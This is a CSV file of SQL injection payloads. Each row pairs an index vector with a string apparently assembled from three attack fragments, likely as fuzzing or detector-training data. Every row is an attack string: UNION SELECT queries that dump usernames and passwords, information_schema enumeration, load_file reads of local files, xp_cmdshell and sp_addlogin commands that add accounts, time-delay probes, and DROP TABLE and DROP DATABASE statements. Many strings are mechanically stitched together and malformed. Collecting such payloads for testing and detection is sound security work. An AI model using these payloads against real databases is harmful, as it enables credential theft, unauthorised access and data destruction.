sig_vector,sig_string
"[6, 47, 67]"," 1)) or union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ';--"
"[5, 54, 68]",") and union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 */"
"[1, 50, 78]","') or 1 = 2 union all select user()  = 1 union select 1,2,3  /*"
"[19, 50, 82]", or'1'='1 1 = 2 union all select user()  drop table sc3；
"[19, 62, 72]", or'1'='1 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= = 2 --
"[6, 51, 73]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3>=0 --"
"[22, 50, 82]"," union select 1,2 1 = 2 union all select user()  drop table sc3；"
"[36, 50, 35]", (select @@version） 1 = 2 union all select user()  delete table dirs 
"[6, 49, 78]"," 1)) or  union select 1,2,load_file('C://1.txt') = 1 union select 1,2,3  /*"
"[6, 0, 78]"," 1)) or '' or = 1 union select 1,2,3  /*"
"[6, 13, 78]"," 1)) or  admin' = 1 union select 1,2,3  /*"
"[25, 36, 57]"," updatexml(1,concat(0x7e,(select @@version),0x7e),1)  (select @@version）union select 1,@@datadir,3"
"[6, 32, 67]"," 1)) or  union select 1,2,(database()) ';--"
"[6, 5, 67]", 1)) or ) and ';--
"[6, 36, 54]"," 1)) or  (select @@version）union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[6, 54, 54]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[5, 5, 81]",) and ) and  create table test like users;
"[5, 47, 81]",") and union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  create table test like users;"
"[6, 50, 67]", 1)) or  1 = 2 union all select user() ';--
"[6, 54, 78]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 = 1 union select 1,2,3  /*"
"[19, 54, 23]"," or'1'='1union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,username,password from users where id=2"
"[1, 54, 78]","') orunion select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 = 1 union select 1,2,3  /*"
"[6, 36, 57]"," 1)) or  (select @@version）union select 1,@@datadir,3"
"[44, 26, 81]","create table dirs(paths varchar(100), id int) union select 1,1,1,load_file(c:\\boot.ini) 
 create table test like users;"
"[57, 54, 32]","union select 1,@@datadir,3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database()) "
"[5, 13, 81]",) and  admin' create table test like users;
"[6, 54, 73]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3>=0 --"
"[49, 54, 54]"," union select 1,2,load_file('C://1.txt')union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[6, 37, 51]"," 1)) or  WAITFOR DELAY '0:0:5'union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[6, 54, 57]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,@@datadir,3"
"[6, 54, 24]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 1=(if((user() regexp '^r'),1,0))"
"[6, 5, 57]"," 1)) or ) and union select 1,@@datadir,3"
"[3, 54, 6]","'')) orunion select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 1)) or "
"[49, 54, 13]"," union select 1,2,load_file('C://1.txt')union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 admin'"
"[38, 36, 47]"," (select Count(*) from table)>0 (select @@version）union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 "
"[6, 44, 54]"," 1)) or create table dirs(paths varchar(100), id int)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[6, 54, 17]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 ' and 1=2"
"[6, 54, 20]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 exists (select * from sysobjects)"
"[7, 7, 51]","and 0 ><and 0 ><union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[6, 26, 7]"," 1)) or  union select 1,1,1,load_file(c:\\boot.ini) 
and 0 ><"
"[6, 35, 54]"," 1)) or  delete table dirs union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[78, 15, 57]"," = 1 union select 1,2,3  /* and 1=2 union select 1,@@datadir,3"
"[6, 36, 20]", 1)) or  (select @@version） exists (select * from sysobjects)
"[63, 36, 54]","1 (select @@version）union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[56, 41, 78]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)exec master.dbo.sp_addlogin username = 1 union select 1,2,3  /*"
"[6, 54, 65]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 ) --"
"[6, 54, 45]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3extractvalue(1, concat(0x7e,@@version,0x7e))"
"[22, 36, 57]"," union select 1,2 (select @@version）union select 1,@@datadir,3"
"[49, 54, 21]"," union select 1,2,load_file('C://1.txt')union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 select * from users where id=1 "
"[20, 36, 54]"," exists (select * from sysobjects) (select @@version）union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[47, 41, 56]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 exec master.dbo.sp_addlogin usernameunion select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[58, 36, 78]"," (select count(*) from sysobjects) (select @@version） = 1 union select 1,2,3  /*"
"[6, 32, 6]"," 1)) or  union select 1,2,(database())  1)) or "
"[32, 12, 56]"," union select 1,2,(database()) 1 'union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[82, 43, 57]"," drop table sc3；exec master.dbo.xp_cmdshell 'net user username password /add'union select 1,@@datadir,3"
"[51, 20, 44]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 exists (select * from sysobjects)create table dirs(paths varchar(100), id int)"
"[20, 36, 33]", exists (select * from sysobjects) (select @@version） exec master..xp_cmdshell '
"[6, 54, 25]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 updatexml(1,concat(0x7e,(select @@version),0x7e),1) "
"[33, 36, 57]"," exec master..xp_cmdshell ' (select @@version）union select 1,@@datadir,3"
"[47, 36, 51]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[6, 36, 55]", 1)) or  (select @@version） order by 1
"[26, 36, 20]"," union select 1,1,1,load_file(c:\\boot.ini) 
 (select @@version） exists (select * from sysobjects)"
"[7, 36, 15]",and 0 >< (select @@version） and 1=2 
"[6, 18, 78]"," 1)) or  && = 1 union select 1,2,3  /*"
"[30, 36, 56]"," select version() (select @@version）union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[6, 54, 66]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3;--"
"[78, 47, 54]"," = 1 union select 1,2,3  /*union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[29, 82, 80]", drop database db drop table sc3； and 1=1;
"[68, 35, 54]"," */ delete table dirs union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[6, 36, 18]", 1)) or  (select @@version） &&
"[49, 36, 80]"," union select 1,2,load_file('C://1.txt') (select @@version） and 1=1;"
"[44, 54, 66]","create table dirs(paths varchar(100), id int)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3;--"
"[6, 54, 18]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 &&"
"[78, 31, 1]"," = 1 union select 1,2,3  /* benchmark(3000000,MD5(1))') or"
"[78, 36, 54]"," = 1 union select 1,2,3  /* (select @@version）union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[6, 35, 3]", 1)) or  delete table dirs '')) or
"[0, 36, 54]","'' or (select @@version）union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[8, 78, 54]","and(  = 1 union select 1,2,3  /*union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[36, 23, 78]"," (select @@version） union select 1,username,password from users where id=2 = 1 union select 1,2,3  /*"
"[6, 10, 54]"," 1)) or  +union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[51, 11, 57]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 ) or union select 1,@@datadir,3"
"[6, 8, 36]", 1)) or and(  (select @@version）
"[19, 50, 32]"," or'1'='1 1 = 2 union all select user()  union select 1,2,(database()) "
"[56, 54, 21]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 select * from users where id=1 "
"[6, 47, 57]"," 1)) or union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,@@datadir,3"
"[78, 54, 54]"," = 1 union select 1,2,3  /*union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[6, 23, 78]"," 1)) or  union select 1,username,password from users where id=2 = 1 union select 1,2,3  /*"
"[7, 19, 26]","and 0 >< or'1'='1 union select 1,1,1,load_file(c:\\boot.ini) 
"
"[6, 19, 16]", 1)) or  or'1'='1 and 
"[6, 54, 6]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 1)) or "
"[16, 47, 57]"," and union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,@@datadir,3"
"[50, 36, 71]", 1 = 2 union all select user()  (select @@version） = 1 --
"[54, 17, 65]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 ' and 1=2 ) --"
"[20, 36, 17]", exists (select * from sysobjects) (select @@version） ' and 1=2
"[36, 23, 23]"," (select @@version） union select 1,username,password from users where id=2 union select 1,username,password from users where id=2"
"[82, 36, 13]", drop table sc3； (select @@version） admin'
"[60, 36, 82]","ord(mid(user(),1,1))=114 (select @@version） drop table sc3；"
"[6, 36, 30]", 1)) or  (select @@version） select version()
"[47, 36, 49]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version） union select 1,2,load_file('C://1.txt')"
"[1, 16, 51]","') or and union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[51, 27, 28]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1(select count(*) from mysql.user)>0"
"[0, 26, 54]","'' or union select 1,1,1,load_file(c:\\boot.ini) 
union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[56, 54, 56]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[10, 36, 56]"," + (select @@version）union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[32, 54, 50]"," union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 1 = 2 union all select user() "
"[23, 22, 54]"," union select 1,username,password from users where id=2 union select 1,2union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[6, 28, 36]", 1)) or (select count(*) from mysql.user)>0 (select @@version）
"[36, 54, 23]"," (select @@version）union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,username,password from users where id=2"
"[6, 44, 78]"," 1)) or create table dirs(paths varchar(100), id int) = 1 union select 1,2,3  /*"
"[82, 36, 54]"," drop table sc3； (select @@version）union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[78, 32, 54]"," = 1 union select 1,2,3  /* union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[3, 49, 21]","'')) or union select 1,2,load_file('C://1.txt') select * from users where id=1 "
"[78, 36, 29]"," = 1 union select 1,2,3  /* (select @@version） drop database db"
"[6, 82, 30]", 1)) or  drop table sc3； select version()
"[36, 59, 82]", (select @@version） (select count(*) from admin where len(*)>0) drop table sc3；
"[36, 75, 78]"," (select @@version） ;select 1,2,3; = 1 union select 1,2,3  /*"
"[11, 30, 36]", ) or  select version() (select @@version）
"[57, 17, 29]","union select 1,@@datadir,3 ' and 1=2 drop database db"
"[36, 8, 54]"," (select @@version）and( union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[47, 0, 26]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 '' or union select 1,1,1,load_file(c:\\boot.ini) 
"
"[8, 34, 62]",and(  INSERT INTO 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[78, 23, 54]"," = 1 union select 1,2,3  /* union select 1,username,password from users where id=2union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[82, 32, 54]"," drop table sc3； union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[82, 54, 54]"," drop table sc3；union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[6, 11, 54]"," 1)) or  ) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[47, 54, 49]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,load_file('C://1.txt')"
